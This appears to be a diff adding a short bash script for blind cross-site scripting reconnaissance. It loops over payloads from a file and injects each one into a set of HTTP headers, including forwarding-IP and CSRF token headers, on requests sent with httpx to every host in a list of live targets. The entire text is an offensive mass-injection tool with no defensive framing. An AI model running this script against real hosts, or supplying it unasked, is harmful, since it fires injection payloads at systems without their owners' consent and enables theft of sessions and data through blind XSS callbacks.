@@ -1,0 +1,10 @@
+while read bxss;do
+
+	cat alivehosts.txt | httpx \
+    	-H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss"
+	
+    cat alivehosts.txt | httpx \
+    	-H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \
+    	-H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss"
+
+done < bxss_payload.txt
